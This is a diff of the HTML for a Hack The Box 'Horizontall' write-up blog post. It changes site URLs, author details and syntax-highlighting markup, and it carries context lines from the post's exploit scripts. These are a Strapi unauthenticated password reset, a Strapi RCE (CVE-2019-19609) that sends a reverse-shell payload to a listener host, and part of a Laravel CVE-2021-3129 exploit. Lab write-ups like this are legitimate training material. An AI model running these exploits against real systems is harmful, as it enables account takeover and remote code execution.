@@ -18,14 +18,14 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="bynafrez08.io">
 <meta property="og:title" content="HTB - Horinzontall">
-<meta property="og:url" content="http://localhost:4000/htb-horizontall/">
+<meta property="og:url" content="http://0.0.0.0:4000/htb-horizontall/">
 
 
   <meta property="og:description" content="Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, change users passwords and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).">
 
 
 
-  <meta property="og:image" content="http://localhost:4000/assets/images/img-horizontall/portada.png">
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/images/img-horizontall/portada.png">
 
 
 
@@ -42,7 +42,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/htb-horizontall/">
+<link rel="canonical" href="http://0.0.0.0:4000/htb-horizontall/">
 
 
 
@@ -55,7 +55,7 @@
       "@context": "https://schema.org",
       "@type": "Person",
       "name": "",
-      "url": "http://localhost:4000",
+      "url": "http://0.0.0.0:4000",
       "sameAs": null
     }
   </script>
@@ -167,7 +167,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="http://0.0.0.0:4000/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1">
         </li>
         <span class="sep">/</span>
@@ -195,18 +195,18 @@
       
 
       
-        <img src="/assets/images/avatar1.png" alt="Nafsu Uddin | AKA bynafrez" itemprop="image">
+        <img src="/assets/images/avatar1.png" alt="bynafrez" itemprop="image">
       
     </div>
   
 
   <div class="author__content">
     
-      <h3 class="author__name" itemprop="name">Nafsu Uddin | AKA bynafrez</h3>
+      <h3 class="author__name" itemprop="name">bynafrez</h3>
     
     
       <p class="author__bio" itemprop="description">
-        Networking / Pentesting / Offensive Security
+        Offensive Security / CTF / Networking / IT enthusiast
       </p>
     
   </div>
@@ -357,19 +357,19 @@
  
 <span class="c1"># python3 wichSystem.py YOURIP 
 </span> 
-<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  
 <span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
  
-    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 %s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
  
-    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
-    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
  
-    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
  
     <span class="k">return</span> <span class="n">ttl_value</span>
  
@@ -386,12 +386,12 @@
  
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  
-    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  
     <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
  
     <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="si">%</span><span class="s">s (ttl -&gt; </span><span class="si">%</span><span class="s">s): </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s (ttl -&gt; %s): %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
 </code></pre></div></div>
 
 <h2 id="scanning---ports-recognition">Scanning - Ports recognition</h2>
@@ -538,34 +538,34 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="n">strapiUrl</span> <span class="o">=</span> <span class="s">"http://api-prod.horizontall.htb"</span>
 <span class="n">newPassword</span> <span class="o">=</span> <span class="s">"code12345"</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
 
 <span class="c1"># Get strapi version
-</span><span class="n">strapiVersion</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"{}/admin/strapiVersion"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">))</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span><span class="n">strapiVersion</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"{}/admin/strapiVersion"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">)).</span><span class="n">text</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s">"[*] strapi version: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">]))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[*] strapi version: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">]))</span>
 
 <span class="c1"># Validate vulnerable version
-</span><span class="k">if</span> <span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'3.0.0-beta'</span><span class="p">)</span> <span class="ow">or</span> <span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'3.0.0-alpha'</span><span class="p">):</span>
+</span><span class="k">if</span> <span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">].</span><span class="n">startswith</span><span class="p">(</span><span class="s">'3.0.0-beta'</span><span class="p">)</span> <span class="ow">or</span> <span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">].</span><span class="n">startswith</span><span class="p">(</span><span class="s">'3.0.0-alpha'</span><span class="p">):</span>
 	<span class="c1"># Password reset
-</span>	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Password reset for user: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">userEmail</span><span class="p">))</span>
-	<span class="n">resetPasswordReq</span><span class="o">=</span><span class="p">{</span><span class="s">"email"</span><span class="p">:</span><span class="n">userEmail</span><span class="p">,</span> <span class="s">"url"</span><span class="p">:</span><span class="s">"{}/admin/plugins/users-permissions/auth/reset-password"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">)}</span>
-	<span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="n">resetPasswordReq</span><span class="p">)</span>
+</span>	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Password reset for user: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">userEmail</span><span class="p">))</span>
+	<span class="n">resetPasswordReq</span><span class="o">=</span><span class="p">{</span><span class="s">"email"</span><span class="p">:</span><span class="n">userEmail</span><span class="p">,</span> <span class="s">"url"</span><span class="p">:</span><span class="s">"{}/admin/plugins/users-permissions/auth/reset-password"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">)}</span>
+	<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="n">resetPasswordReq</span><span class="p">)</span>
 
 	<span class="c1"># Set new password
 </span>	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Setting new password"</span><span class="p">)</span>
 	<span class="n">exploit</span><span class="o">=</span><span class="p">{</span><span class="s">"code"</span><span class="p">:{},</span> <span class="s">"password"</span><span class="p">:</span><span class="n">newPassword</span><span class="p">,</span> <span class="s">"passwordConfirmation"</span><span class="p">:</span><span class="n">newPassword</span><span class="p">}</span>
-	<span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/admin/auth/reset-password"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="n">exploit</span><span class="p">)</span>
+	<span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/admin/auth/reset-password"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="n">exploit</span><span class="p">)</span>
 
 	<span class="c1"># Check if the password has changed
-</span>	<span class="k">if</span> <span class="s">"username"</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
-		<span class="k">print</span><span class="p">(</span><span class="s">"[+] New password '{}' set for user {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">newPassword</span><span class="p">,</span> <span class="n">userEmail</span><span class="p">))</span>
+</span>	<span class="k">if</span> <span class="s">"username"</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">):</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"[+] New password '{}' set for user {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">newPassword</span><span class="p">,</span> <span class="n">userEmail</span><span class="p">))</span>
 	<span class="k">else</span><span class="p">:</span>
 		<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[91m[-] Something went wrong</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">)</span>
-		<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
 	<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[91m[-] This version is not vulnerable</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">)</span>
-	<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>According to the indication of this exploit we execute the script as follow command, and it should change the user’s password.</p>
@@ -598,17 +598,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">argparse</span>
 
-<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Exploit for CVE-2019-16609 in Strapi'</span><span class="p">)</span>
-<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--domain'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Target IP or domain'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-jwt'</span><span class="p">,</span> <span class="s">'--jwtoken'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Json web token authenticate'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span> <span class="s">'--lhost'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Your host'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Port your machine is listening on'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Exploit for CVE-2019-16609 in Strapi'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--domain'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Target IP or domain'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-jwt'</span><span class="p">,</span> <span class="s">'--jwtoken'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Json web token authenticate'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span> <span class="s">'--lhost'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Your host'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Port your machine is listening on'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
 
-<span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">domain</span>
-<span class="n">port</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span>
-<span class="n">jwt</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">jwtoken</span>
-<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">lhost</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">domain</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span>
+<span class="n">jwt</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">jwtoken</span>
+<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">lhost</span>
 <span class="n">urlVuln</span> <span class="o">=</span> <span class="s">"http://"</span><span class="o">+</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/plugins/install"</span>
 
 <span class="k">print</span><span class="p">(</span><span class="s">"[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)"</span><span class="p">)</span>
@@ -621,11 +621,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span>
 <span class="k">print</span><span class="p">(</span><span class="s">"[+] Sending payload... Check if you got shell"</span><span class="p">)</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlVuln</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlVuln</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
 
 <span class="k">print</span><span class="p">(</span><span class="s">"[+] Payload sent. Response:"</span><span class="p">)</span>
 <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>So if we want to run the exploit it tells us that we need a jwt from a valid user, in this case i use burpsuite and i will use the jwt of the admin user.</p>
@@ -781,17 +781,17 @@ Service detection performed. Please report any incorrect results at https://nmap
     <span class="k">global</span> <span class="n">data</span>
 
     <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
-    <span class="k">while</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">):</span> <span class="k">pass</span>
-    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">).</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">):</span> <span class="k">pass</span>
+    <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">create_payload</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">viewFile</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
 
     <span class="k">global</span> <span class="n">data</span>
 
     <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
-    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="n">f</span><span class="s">'file_get_contents({viewFile})'</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="sa">f</span><span class="s">'file_get_contents(</span><span class="si">{</span><span class="n">viewFile</span><span class="si">}</span><span class="s">)'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">True</span>
     <span class="k">return</span> <span class="bp">False</span>
 
@@ -800,8 +800,8 @@ Service detection performed. Please report any incorrect results at https://nmap
     <span class="k">global</span> <span class="n">data</span>
 
     <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
-    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">True</span>
     <span class="k">return</span> <span class="bp">False</span>
 
@@ -810,42 +810,42 @@ Service detection performed. Please report any incorrect results at https://nmap
     <span class="k">global</span> <span class="n">data</span>
 
     <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
-    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
